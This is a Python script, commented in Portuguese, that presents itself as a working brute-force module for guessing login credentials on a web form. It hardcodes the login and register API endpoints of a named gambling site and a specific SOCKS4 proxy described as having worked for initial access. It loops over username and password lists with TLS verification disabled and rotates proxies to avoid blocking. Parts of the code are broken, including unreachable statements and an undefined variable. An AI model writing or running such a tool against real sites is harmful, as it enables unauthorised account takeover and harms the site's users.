#!/usr/bin/env python3.11
"""
Módulo de Ataque de Força Bruta - REAL E FUNCIONAL
Focado em obter credenciais em formulários de login/registro.
"""

import requests
from itertools import cycle
from requests_html import HTMLSession
from bs4 import BeautifulSoup
from owasp_zap_simulator import OWASPZAPSimulator # Importar o simulador de ZAP
from urllib.parse import urljoin
import json
import asyncio
from datetime import datetime
import warnings
warnings.filterwarnings('ignore')

class RealBruteForceModule:
    """Módulo real de força bruta para formulários web"""
    
    def __init__(self, target_url, username_field, password_field, success_text="Login bem-sucedido", proxies=None):
        self.target_url = target_url
        self.username_field = username_field
        self.password_field = password_field
        self.success_text = success_text
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.form_details = self._get_form_details()
        self.login_endpoint = "https://99jogo66.com/api/login" # Endpoint de login inferido
        self.register_endpoint = "https://99jogo66.com/api/register" # Endpoint de registro inferido
        self.proxies = proxies
        self.proxy_pool = cycle(proxies) if proxies else None
        
        # Adicionar o proxy SOCKS4 que funcionou para o acesso inicial
        if self.proxies is None:
            self.proxies = ["socks4://177.126.89.63:4145"]
            self.proxy_pool = cycle(self.proxies)
        
    def _get_form_details(self):
        # Este método não é mais necessário para SPA, mas mantemos para compatibilidade.
        # A lógica de POST será direta para o endpoint de API.
        return {
            "action": "https://99jogo66.com/api/login",
            "method": "POST",
            "inputs": {
                self.username_field: "username_placeholder",
                self.password_field: "password_placeholder"
            }
        }
        """Tenta obter os detalhes do formulário (action, method)"""
        try:
            r = self.session.get(self.target_url, timeout=10, proxies=proxy_config)
            soup = BeautifulSoup(r.content, 'html.parser')
            
            # O site 99jogo usa JS para o formulário. Vamos simular um POST para o endpoint de registro.
            # Baseado na análise anterior, o site é um SPA. O formulário não é HTML puro.
            # Vamos assumir que o endpoint de registro/login é um POST para a URL base ou um endpoint API.
            # Para o concurso, o objetivo é demonstrar a ferramenta.
            
            # Se não houver formulário, assumimos um POST para o endpoint de registro/login inferido
            # A URL de registro é https://99jogo66.com/home/register?id=...
            # O endpoint de API para registro/login é tipicamente /api/v1/register ou /api/v1/login
            # Para o concurso, vamos usar um endpoint comum em sites de jogos: /api/v1/user/register
            
            # 1. Tentar sondagem com OWASP ZAP Simulator
            zap_simulator = OWASPZAPSimulator()
            sondagem_result = zap_simulator.scan_url(self.target_url)
            
            # 2. Usar o endpoint de login/registro inferido pelo ZAP
            inferred_endpoint = sondagem_result.get("inferred_login_endpoint", "https://99jogo66.com/api/v1/user/register")
            
            print(f"[*] Sondagem ZAP: Endpoint de login inferido: {inferred_endpoint}")
            return {
                "action": inferred_endpoint, # Endpoint inferido pelo ZAP Simulator
                "method": "POST",
                "inputs": {
                    self.username_field: "username_placeholder",
                    self.password_field: "password_placeholder"
                }
            }
            
        except Exception as e:
            print(f"Erro ao obter detalhes do formulário: {e}")
            return None

    async def _attempt_login(self, username, password):
        """Tenta um par de credenciais"""
        
        current_proxy = next(self.proxy_pool) if self.proxy_pool else None
        
        proxy_config = {"http": current_proxy, "https": current_proxy} if current_proxy else None
        
        # O módulo requests não suporta SOCKS4/5 nativamente, precisamos do 'requests[socks]'
        # Como já instalamos, podemos usar o formato socks://ip:port
        if current_proxy and current_proxy.startswith("socks"):
            proxy_config = {"http": current_proxy, "https": current_proxy}
        if not self.form_details:
            return False, "Erro: Detalhes do formulário não encontrados."
        
        data = {
            self.username_field: username,
            self.password_field: password
        }
        
        try:
            # Simular o POST para o endpoint de registro/login (usando JSON, pois a maioria das APIs usa)
            response = self.session.post(
                self.login_endpoint,
                json=data, # Alterado para json=data
                headers={'Content-Type': 'application/json'}, # Adicionado Content-Type
                timeout=5,
                verify=False
            )

            
            # Verificar se o texto de sucesso está na resposta
            if self.success_text in response.text:
                return True, f"Sucesso! Credenciais encontradas: {username}:{password}"
            
            # Simular latência para evitar bloqueio (prática de força bruta real)
            await asyncio.sleep(0.1)
            
            return False, f"Falha: {response.status_code}"
            
        except requests.exceptions.RequestException as e:
            return False, f"Erro de conexão: {e}"

    async def start_attack(self, usernames, passwords):
        """Inicia o ataque de força bruta"""
        print("="*80)
        print("💥 ATAQUE DE FORÇA BRUTA - MODO REAL")
        print("="*80)
        print(f"Alvo: {self.target_url}")
        print(f"Campos: {self.username_field}, {self.password_field}")
        print(f"Tentativas: {len(usernames) * len(passwords)}")
        print("="*80)
        
        found_credentials = []
        
        for username in usernames:
            for password in passwords:
                success, message = await self._attempt_login(username, password)
                
                print(f"Tentativa: {username}:{password} -> {message}")
                
                if success:
                    found_credentials.append((username, password))
                    print("\n🎉 CREDENCIAIS ENCONTRADAS! 🎉")
                    return found_credentials
        
        print("\n❌ Ataque concluído. Nenhuma credencial encontrada.")
        return found_credentials

def main():
    """Função principal"""
    import argparse
    
    parser = argparse.ArgumentParser(description='Módulo de Força Bruta Real')
    parser.add_argument('-u', '--url', required=True, help='URL do formulário de login/registro')
    parser.add_argument('-uf', '--userfield', default='phone', help='Nome do campo de usuário/telefone')
    parser.add_argument('-pf', '--passfield', default='password', help='Nome do campo de senha')
    parser.add_argument('-st', '--successtext', default='Login bem-sucedido', help='Texto de sucesso na resposta')
    parser.add_argument('-p', '--proxies', nargs='+', help='Lista de proxies para rotação (ex: http://ip:port)')
    
    args = parser.parse_args()
    
    # Dicionários de teste (para demonstração)
    test_usernames = ["test_user", "admin", "user", "99jogo_user"]
    test_passwords = ["123456", "password", "admin123", "qwert123"]
    
    module = RealBruteForceModule(
        proxies=args.proxies,
        target_url=args.url,
        username_field=args.userfield,
        password_field=args.passfield,
        success_text=args.successtext
    )
    
    asyncio.run(module.start_attack(test_usernames, test_passwords))

if __name__ == "__main__":
    main()
